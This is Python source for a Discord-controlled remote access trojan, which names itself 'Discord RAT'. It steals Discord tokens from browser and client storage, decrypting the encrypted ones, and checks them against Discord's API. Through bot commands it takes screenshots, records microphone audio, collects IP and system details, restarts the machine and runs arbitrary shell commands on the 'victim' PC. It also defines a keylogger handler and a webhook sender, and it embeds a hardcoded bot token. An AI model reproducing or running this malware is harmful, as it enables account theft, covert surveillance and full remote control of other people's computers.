import requests
import json
import os
import re
import base64
from Cryptodome.Cipher import AES
from win32crypt import CryptUnprotectData
from pynput import keyboard
import socket
import pyautogui
import platform
import pyaudio
import wave
import discord
from discord.ext import commands
import psutil
import subprocess

tk = "MTIzMTU3Mjc0NTEwNDUyNzQ4Mw.G2VlG4.2AhI8qXFKoDwF_U41XoAgHh1Yae40Rl9hd8ImI"
prefix = "$"
gojo = commands.Bot(command_prefix=prefix,intents=discord.Intents.all(),help_command=None)

@gojo.event
async def on_ready():
    print("bot attivo")

commonprefixs = ["MT", "OT", "Nj", "OD", "MD"]
base_url = "https://discord.com/api/v9/users/@me"
appdata = os.getenv("localappdata")
roaming = os.getenv("appdata")
regexp = r"[\w-]{24}\.[\w-]{6}\.[\w-]{25,110}"
regexp_enc = r"dQw4w9WgXcQ:[^\"]*"

paths = {
    'Discord': roaming + '\\discord\\Local Storage\\leveldb\\',
    'Discord Canary': roaming + '\\discordcanary\\Local Storage\\leveldb\\',
    'Lightcord': roaming + '\\Lightcord\\Local Storage\\leveldb\\',
    'Discord PTB': roaming + '\\discordptb\\Local Storage\\leveldb\\',
    'Opera': roaming + '\\Opera Software\\Opera Stable\\Local Storage\\leveldb\\',
    'Opera GX': roaming + '\\Opera Software\\Opera GX Stable\\Local Storage\\leveldb\\',
    'Amigo': appdata + '\\Amigo\\User Data\\Local Storage\\leveldb\\',
    'Torch': appdata + '\\Torch\\User Data\\Local Storage\\leveldb\\',
    'Kometa': appdata + '\\Kometa\\User Data\\Local Storage\\leveldb\\',
    'Orbitum': appdata + '\\Orbitum\\User Data\\Local Storage\\leveldb\\',
    'CentBrowser': appdata + '\\CentBrowser\\User Data\\Local Storage\\leveldb\\',
    '7Star': appdata + '\\7Star\\7Star\\User Data\\Local Storage\\leveldb\\',
    'Sputnik': appdata + '\\Sputnik\\Sputnik\\User Data\\Local Storage\\leveldb\\',
    'Vivaldi': appdata + '\\Vivaldi\\User Data\\Default\\Local Storage\\leveldb\\',
    'Chrome SxS': appdata + '\\Google\\Chrome SxS\\User Data\\Local Storage\\leveldb\\',
    'Chrome': appdata + '\\Google\\Chrome\\User Data\\Default\\Local Storage\\leveldb\\',
    'Chrome1': appdata + '\\Google\\Chrome\\User Data\\Profile 1\\Local Storage\\leveldb\\',
    'Chrome2': appdata + '\\Google\\Chrome\\User Data\\Profile 2\\Local Storage\\leveldb\\',
    'Chrome3': appdata + '\\Google\\Chrome\\User Data\\Profile 3\\Local Storage\\leveldb\\',
    'Chrome4': appdata + '\\Google\\Chrome\\User Data\\Profile 4\\Local Storage\\leveldb\\',
    'Chrome5': appdata + '\\Google\\Chrome\\User Data\\Profile 5\\Local Storage\\leveldb\\',
    'Epic Privacy Browser': appdata + '\\Epic Privacy Browser\\User Data\\Local Storage\\leveldb\\',
    'Microsoft Edge': appdata + '\\Microsoft\\Edge\\User Data\\Default\\Local Storage\\leveldb\\',
    'Uran': appdata + '\\uCozMedia\\Uran\\User Data\\Default\\Local Storage\\leveldb\\',
    'Yandex': appdata + '\\Yandex\\YandexBrowser\\User Data\\Default\\Local Storage\\leveldb\\',
    'Brave': appdata + '\\BraveSoftware\\Brave-Browser\\User Data\\Default\\Local Storage\\leveldb\\',
    'Iridium': appdata + '\\Iridium\\User Data\\Default\\Local Storage\\leveldb\\'
}

def get_master_key(path: str) -> str:
    if not os.path.exists(path):
        return None

    with open(path, "r", encoding="utf-8") as f:
        local_state = json.load(f)
    
    encrypted_key = base64.b64decode(local_state["os_crypt"]["encrypted_key"])[5:]
    master_key = CryptUnprotectData(encrypted_key, None, None, None, 0)[1]
    return master_key

def decrypt_val(buff: bytes, master_key: bytes) -> str:
    iv = buff[3:15]
    payload = buff[15:]
    cipher = AES.new(master_key, AES.MODE_GCM, iv)
    decrypted_pass = cipher.decrypt(payload)[:-16]
    try:
        return decrypted_pass.decode()
    except:
        return None

def validate_token(token: str) -> bool:
    if not token:
        return False

    try:
        response = requests.get(base_url, headers={'Authorization': token})
        if response.status_code == 200:
            return True
        else:
            if not token[:2] in commonprefixs:
                for prefix in commonprefixs:
                    new_token = prefix + token
                    response = requests.get(base_url, headers={'Authorization': new_token})
                    if response.status_code == 200:
                        return True
    except:
        pass

    return False

def extract_tokens_from_path(path: str) -> list:
    tokens = []
    if not os.path.exists(path):
        return tokens

    for file_name in os.listdir(path):
        if file_name[-3:] not in ["log", "ldb"]:
            continue

        file_path = os.path.join(path, file_name)
        with open(file_path, 'r', errors='ignore') as file:
            lines = file.readlines()

        for line in lines:
            line = line.strip()
            if not line:
                continue

            matches = re.findall(regexp, line)
            for token in matches:
                if validate_token(token):
                    tokens.append(token)

    return tokens

def extract_encrypted_tokens_from_path(path: str, master_key: bytes) -> list:
    tokens = []
    if not os.path.exists(path):
        return tokens

    for file_name in os.listdir(path):
        if file_name[-3:] not in ["log", "ldb"]:
            continue

        file_path = os.path.join(path, file_name)
        with open(file_path, 'r', errors='ignore') as file:
            lines = file.readlines()

        for line in lines:
            line = line.strip()
            if not line:
                continue

            matches = re.findall(regexp_enc, line)
            for match in matches:
                encrypted_token = base64.b64decode(match.split('dQw4w9WgXcQ:')[1])
                token = decrypt_val(encrypted_token, master_key)
                if validate_token(token):
                    tokens.append(token)

    return tokens

def extract_tokens() -> list:
    all_tokens = []
    uids = []

    for name, path in paths.items():
        tokens = extract_tokens_from_path(path)
        all_tokens.extend(tokens)

        if "cord" in name.lower():
            master_key = get_master_key(os.path.join(roaming, name.replace(" ", "").lower(), 'Local State'))
            if master_key:
                encrypted_tokens = extract_encrypted_tokens_from_path(path, master_key)
                all_tokens.extend(encrypted_tokens)

    if os.path.exists(roaming + "\\Mozilla\\Firefox\\Profiles"):
        for path, _, files in os.walk(roaming + "\\Mozilla\\Firefox\\Profiles"):
            for file in files:
                if file.endswith('.sqlite'):
                    tokens = extract_tokens_from_path(os.path.join(path, file))
                    all_tokens.extend(tokens)

    unique_tokens = []
    for token in all_tokens:
        uid = requests.get(base_url, headers={'Authorization': token}).json().get('id')
        if uid and uid not in uids:
            unique_tokens.append(token)
            uids.append(uid)

    return unique_tokens

def getall() -> list:
    return extract_tokens()

#credits for the code above to Gray Raven

def send_to_webhook(webhook_url: str, content: str) -> None:
    data = {
        "content": content
    }
    requests.post(webhook_url, json=data)

def handle_keys(key:keyboard.Key):
    with open("keys.txt","a") as file:
        file.write(str(key).strip("'"))

def screen(filename="screenshot.png"):
    pyautogui.screenshot(filename)

@gojo.command()
async def screenshot(ctx):
    filename = "screenshot.png"
    screen(filename)
    await ctx.send(file=discord.File(filename))
    os.remove("screenshot.png")

def record_audio(filename="output.wav", record_seconds=5):
    CHUNK = 1024
    FORMAT = pyaudio.paInt16
    CHANNELS = 1
    RATE = 44100
    audio = pyaudio.PyAudio()
    
    stream = audio.open(format=FORMAT, channels=CHANNELS, input=True, rate=RATE, frames_per_buffer=CHUNK)
    frames = []

    for _ in range(0, int(RATE / CHUNK * record_seconds)):
        data = stream.read(CHUNK)
        frames.append(data)
    
    stream.stop_stream()
    stream.close()
    audio.terminate()

    wf = wave.open(filename, 'wb')
    wf.setnchannels(CHANNELS)
    wf.setsampwidth(audio.get_sample_size(FORMAT))
    wf.setframerate(RATE)
    wf.writeframes(b''.join(frames))
    wf.close()

@gojo.command()
async def record(ctx, seconds: int = 5):
    filename = "output.wav"
    record_audio(filename, record_seconds=seconds)
    await ctx.send(file=discord.File(filename))
    os.remove("output.wav")

@gojo.command()
async def ip(ctx):
    name = socket.gethostname()
    ip = socket.gethostbyname(name)
    r = requests.get("https://api.ipify.org/").text
    await ctx.send(embed=discord.Embed(title="**Victim IPs**",description=f"""
{name}
{ip}
{r}
"""))

@gojo.command()
async def system(ctx):
    await ctx.send(embed=discord.Embed(title="**System Info**",description=f"""
Operating System: {platform.system()} {platform.release()}
Machine: {platform.machine()}
CPU Cores: {psutil.cpu_count(logical=False)} physical, {psutil.cpu_count(logical=True)} logical
"""))
    
@gojo.command()
async def restart(ctx):
    os.popen("shutdown /r /t 80")
    await ctx.send("done.")

@gojo.command()
async def tokens(ctx):
    for token in getall():
        await ctx.send(embed=discord.Embed(title="**Victim Tokens**",description=token))

@gojo.command()
async def cmd(ctx,*,command):
    result = subprocess.check_output(command,shell=True,stderr=subprocess.STDOUT,text=True)
    await ctx.send(f"Executed: \n```\n{result}```")

@gojo.command()
async def help(ctx):
    embed = discord.Embed(title="Discord RAT",description=f"""
{prefix}tokens - Grab victim's discord tokens
{prefix}screenshot- Send a screenshot of the victim's PC
{prefix}record - Record an audio from the victim's PC
{prefix}ip - Grab victim's IP
{prefix}system - Give information about the victim's PC
{prefix}restart - Restart victim's PC
{prefix}cmd - Execute a CMD command on victim's PC
""", color=0x800080)
    embed.set_image(url="https://tenor.com/view/goku-son-gokuui-ultrainstinct-mui-gif-22712408")
    await ctx.send(embed=embed)



gojo.run(tk)